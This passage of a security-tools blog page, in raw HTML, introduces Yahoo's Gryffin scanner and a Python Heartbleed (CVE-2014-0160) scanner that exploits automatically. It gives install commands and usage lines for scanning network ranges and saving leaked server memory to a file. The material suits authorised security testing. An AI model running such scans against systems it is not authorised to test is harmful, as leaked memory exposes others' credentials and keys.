         <li style="text-align: justify;">Preconfigured docker image available in <a href="https://hub.docker.com/r/yukinying/elk/">https://hub.docker.com/r/yukinying/elk/</a></li> 
        </ul> </li> 
      </ol> 
      <br> 
      <b><span style="font-size: large;"> Installation</span></b>
      <br> 
      <pre><code>go get github.com/yahoo/gryffin/...</code></pre> 
      <br> 
      <b><span style="font-size: large;"> Run</span></b>
      <br> 
      <br> 
      <b><span style="font-size: x-large;"> TODO</span></b>
      <br> 
      <br> 
      <ol> 
       <li>Mobile browser user agent</li> 
       <li>Preconfigured docker images </li> 
       <li>Redis for sharing states across machines</li> 
       <li>Instruction to run gryffin (distributed or standalone)</li> 
       <li>Documentation for html-distance</li> 
       <li>Implement a JSON serializable cookiejar. </li> 
       <li>Identify duplicate url patterns based on simhash result.</li> 
      </ol> 
      <div> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/yahoo/gryffin" target="_blank">Download&nbsp;Gryffin</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7942195329946074809" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Heartbleed Vulnerability Scanner - Network Scanner for OpenSSL Memory Leak (CVE-2014-0160)  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7942195329946074809" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-skuQnYDMoeg/VgyaDSePF2I/AAAAAAAAErQ/_PvtuA7Eobc/s1600/Heartbleed_Scanner.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="322" src="http://4.bp.blogspot.com/-skuQnYDMoeg/VgyaDSePF2I/AAAAAAAAErQ/_PvtuA7Eobc/s640/Heartbleed_Scanner.png" width="640"></a>
      </div> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <br>
      </div> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-4_jmIXJOYP4/VgyazZV8McI/AAAAAAAAErY/0zg4jbkRndU/s1600/Heartbleed%2BScanner.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="206" src="http://4.bp.blogspot.com/-4_jmIXJOYP4/VgyazZV8McI/AAAAAAAAErY/0zg4jbkRndU/s640/Heartbleed%2BScanner.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Heartbleed Vulnerability Scanner is a multiprotocol (HTTP, IMAP, SMTP, POP) CVE-2014-0160 scanning and automatic exploitation tool written with python.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        For scanning wide ranges automatically, you can provide a network range in CIDR notation and an output file to dump the memory of vulnerable system to check after.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Hearbleed Vulnerability Scanner can also get targets from a list file. This is useful if you already have a list of systems using SSL services such as HTTPS, POP3S, SMTPS or IMAPS.
      </div> 
      <pre><code>git clone https://github.com/hybridus/heartbleedscanner.git</code></pre> 
      <br> 
      <b><span style="font-size: large;">Sample usage</span></b>
      <br> 
      <br> To scan your local 192.168.1.0/24 network for heartbleed vulnerability (https/443) and save the leaks into a file:
      <br> 
      <pre><code>python heartbleedscan.py -n 192.168.1.0/24 -f localscan.txt -r</code></pre> 
      <br> To scan the same network against SMTP Over SSL/TLS and randomize the IP addresses
      <br> 
      <pre><code>python heartbleedscan.py -n 192.168.1.0/24 -p 25 -s SMTP -r</code></pre> 
      <br> If you already have a target list which you created by using nmap/zmap
      <br> 
      <pre><code>python heartbleedscan.py -i targetlist.txt</code></pre> 
      <br> 
      <b><span style="font-size: large;">Dependencies</span></b>
      <br> 
      <strong><br></strong> Before using Heartbleed Vulnerability Scanner, you should install&nbsp;
      <strong>python-netaddr</strong>&nbsp;package.
      <br> 
      <br> CentOS or CentOS-like systems :
      <br> 
      <pre><code>yum install python-netaddr</code></pre>
